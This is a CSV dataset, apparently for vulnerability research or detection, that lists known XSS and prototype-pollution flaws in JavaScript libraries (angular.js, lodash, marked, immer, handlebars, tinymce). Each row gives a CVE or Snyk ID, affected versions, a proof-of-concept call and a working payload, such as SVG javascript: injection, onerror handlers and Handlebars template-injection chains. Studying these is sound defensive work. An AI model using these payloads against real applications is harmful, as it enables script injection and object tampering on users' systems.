"cve","package_name","versions","url","source_db","source_url","vuln_type","cwe","sink_type","gadget","poc","payload","keywords","validated"
"NOCVE-npm:angular:20180202","angular.js","{(,1.6.9)}","https://cdnjs.com/libraries/angular.js","cdnjs","https://security.snyk.io/vuln/npm:angular:20180202","xss","CWE-79","function call",False,"{$sanitize(PAYLOAD);}","{""PAYLOAD"": ""<svg xmlns=\""http://www.w3.org/2000/svg\""><a xml:base=\""javascript:alert(1)//\"" href=\""#\""></a></svg>""}",NULL,True
"NOCVE-SNYK-JS-LODASH-608086","lodash.js","{(,4.17.16)}","https://cdnjs.com/libraries/lodash.js","snyk","https://security.snyk.io/vuln/SNYK-JS-LODASH-608086","prototype pollution","CWE-1321","function call",False,"{""LIBOBJ.set(WILDCARD, PAYLOAD1, PAYLOAD2);""}","{""PAYLOAD1"": ""__proto__[foo]"", ""PAYLOAD2"": ""bar""}",NULL,True
"CVE-2018-16487","lodash.js","{(,4.17.11)}","https://cdnjs.com/libraries/lodash.js","snyk","https://security.snyk.io/vuln/SNYK-JS-LODASH-73638","prototype pollution","CWE-1321","function call",False,"{""LIBOBJ.merge(WILDCARD, WILDCARD);""}","{}",NULL,True
"CVE-2020-8203","lodash.js","{(,4.17.16)}","https://cdnjs.com/libraries/lodash.js","snyk","https://security.snyk.io/vuln/SNYK-JS-LODASH-6139239","prototype pollution","CWE-1321","function call",False,"{""LIBOBJ.zipObjectDeep([PAYLOAD1], [PAYLOAD2]);""}","{""PAYLOAD1"": ""__proto__.foo"", ""PAYLOAD2"": ""bar""}",NULL,True
"NOCVE-SNYK-JS-LODASH-6139239","lodash.js","{(,4.17.16)}","https://cdnjs.com/libraries/lodash.js","snyk","https://security.snyk.io/vuln/SNYK-JS-LODASH-6139239","prototype pollution","CWE-1321","function call",False,"{""LIBOBJ.setWith(WILDCARD, PAYLOAD1, PAYLOAD2);""}","{""PAYLOAD1"": ""__proto__.foo"", ""PAYLOAD2"": ""bar""}",NULL,True
"CVE-2017-1000427","marked","{(,0.3.7)}","https://cdnjs.com/libraries/marked","cdnjs","https://security.snyk.io/vuln/npm:marked:20170112","xss","CWE-79","function call",False,"{LIBOBJ.parse(PAYLOAD);,LIBOBJ(PAYLOAD);}","{""PAYLOAD"": ""[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)""}",NULL,True
"NOCVE-npm:marked:20170815-1","marked","{(,0.3.9)}","https://cdnjs.com/libraries/marked","cdnjs","https://security.snyk.io/vuln/npm:marked:20170815-1","xss","CWE-79","function call",False,"{""marked.setOptions({ mangle: false }); LIBOBJ.parse(PAYLOAD);"",""marked.setOptions({ mangle: false }); LIBOBJ(PAYLOAD);""}","{""PAYLOAD"": ""<bar\""onclick=\""alert(1)\""@foo>""}",NULL,True
"CVE-2020-28477","immer","{[7.0.0,8.0.1)}","https://cdnjs.com/libraries/immer","snyk","https://security.snyk.io/vuln/SNYK-JS-IMMER-1019369","prototype pollution","CWE-1321","function call",False,"{""LIBOBJ.enablePatches(); LIBOBJ.applyPatches(WILDCARD, [ { op: 'add', path: [ PAYLOAD1, PAYLOAD2 ], value: PAYLOAD3 } ]);"",""LIBOBJ.enablePatches(); LIBOBJ.applyPatches(WILDCARD, [ { op: 'replace', path: [ PAYLOAD1, PAYLOAD2 ], value: PAYLOAD3 } ]);""}","{""PAYLOAD1"": ""__proto__"", ""PAYLOAD2"": ""foo"", ""PAYLOAD3"": ""bar""}",NULL,True
"NOCVE-SNYK-JS-HANDLEBARS-173692","handlebars.js","{[4.0.0,4.0.13)}","https://cdnjs.com/libraries/handlebars.js","snyk","https://security.snyk.io/vuln/SNYK-JS-HANDLEBARS-173692","prototype pollution","CWE-1321","function call",False,"{LIBOBJ.compile(PAYLOAD)(WILDCARD);}","{""PAYLOAD"": ""{{#with this as |obj|}}{{#with (obj.constructor.keys \""1\"") as |arr|}}{{#with obj.constructor.name as |str|}}{{#blockHelperMissing str.toString}}{{#with (arr.constructor (str.toString.bind \""Object.prototype.foo = 'bar'\""))}}{{#with (obj.constructor.getOwnPropertyDescriptor this 0)}}{{#with (obj.constructor.defineProperty obj.constructor.prototype \""toString\"" this)}}{{#with (obj.constructor.constructor \""test\"")}}{{/with}}{{/with}}{{/with}}{{/with}}{{/blockHelperMissing}}{{/with}}{{/with}}{{/with}}""}",NULL,True
"NOCVE-SNYK-JS-HANDLEBARS-174183","handlebars.js","{[4.0.0,4.0.14),[4.1.0,4.1.2)}","https://cdnjs.com/libraries/handlebars.js","snyk","https://security.snyk.io/vuln/SNYK-JS-HANDLEBARS-174183","prototype pollution","CWE-1321","function call",False,"{LIBOBJ.compile(PAYLOAD)(WILDCARD);}","{""PAYLOAD"": ""{{#with \""s\"" as |string|}}{{#with \""e\""}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \""constructor\"")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \""Object.prototype.foo = 'bar'; return 0;\""}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}""}",NULL,True
"CVE-2020-17480","tinymce","{(,4.9.7),[5.0.0,5.1.4)}","https://cdnjs.com/libraries/tinymce","cdnjs","https://security.snyk.io/vuln/SNYK-JS-TINYMCE-543825","xss","CWE-79","function call",False,"{""WILDCARD.execCommand('mceInsertClipboardContent', WILDCARD, { content: PAYLOAD });""}","{""PAYLOAD"": ""<p><img src=\""x\"" onerror=\""alert(1)\"" /></p>""}",NULL,True
